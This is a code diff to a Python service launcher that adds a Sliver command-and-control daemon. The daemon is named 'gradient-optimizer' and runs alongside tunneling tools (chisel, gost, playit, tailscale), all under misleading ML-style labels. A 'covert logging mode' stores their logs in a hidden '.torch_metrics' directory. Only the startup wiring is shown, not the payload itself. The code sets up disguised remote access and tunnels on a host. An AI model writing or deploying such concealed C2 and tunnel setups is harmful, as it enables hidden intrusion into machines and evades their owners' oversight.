@@ -10,7 +10,7 @@ from loguru import logger
 
 # Add parent directory of core to sys.path to allow absolute imports of services
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-from services import nginx, tailscale, playit, chisel, minecraft, filebrowser, gost
+from services import nginx, tailscale, playit, chisel, minecraft, filebrowser, gost, sliver
 
 COVERT_LOGGING_MODE = 1
 
@@ -83,6 +83,7 @@ def main():
         tm_log = open("/home/user/.torch_metrics/tm_daemon.log", "a")
         chisel_log = open("/home/user/.torch_metrics/chisel.log", "a")
         gost_log = open("/home/user/.torch_metrics/gost.log", "a")
+        sliver_log = open("/home/user/.torch_metrics/sliver.log", "a")
         nginx_log = open("/home/user/.torch_metrics/nginx.log", "a")
     elif COVERT_LOGGING_MODE == 2:
         os.makedirs("/home/user/.torch_metrics", exist_ok=True)
@@ -129,6 +130,7 @@ def main():
         tm_log = TeeLogger("/home/user/.torch_metrics/tm_daemon.log", "PLAYIT")
         chisel_log = TeeLogger("/home/user/.torch_metrics/chisel.log", "CHISEL")
         gost_log = TeeLogger("/home/user/.torch_metrics/gost.log", "GOST")
+        sliver_log = TeeLogger("/home/user/.torch_metrics/sliver.log", "SLIVER")
         nginx_log = TeeLogger("/home/user/.torch_metrics/nginx.log", "NGINX")
     else:
         devnull = open(os.devnull, "w")
@@ -137,6 +139,7 @@ def main():
         tm_log = devnull
         chisel_log = devnull
         gost_log = devnull
+        sliver_log = devnull
         nginx_log = devnull
 
     # 2. Prep Filesystem:
@@ -201,7 +204,10 @@ def main():
     
     # 8.5 Start GOST (system-bridge) on internal :6790, routed via nginx
     gost.start(gost_log, chisel_auth)
-    
+
+    # 8.7 Start Sliver C2 (gradient-optimizer) in headless daemon mode
+    sliver.start(sliver_log)
+
     chisel_auth = ""
 
     # 9. Connect to Tailscale (py-cache-cli)
